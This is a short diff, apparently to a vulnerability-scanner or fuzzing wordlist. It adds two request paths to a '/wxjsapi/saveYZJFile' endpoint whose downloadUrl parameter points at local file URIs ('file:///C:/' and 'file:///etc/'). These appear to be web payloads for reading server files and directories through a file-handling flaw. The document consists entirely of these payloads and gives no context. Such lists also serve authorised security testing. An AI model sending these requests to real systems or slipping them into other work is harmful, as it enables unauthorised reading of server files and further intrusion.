@@ -1,0 +1,2 @@
+/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt
+/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/&fileExt=txt
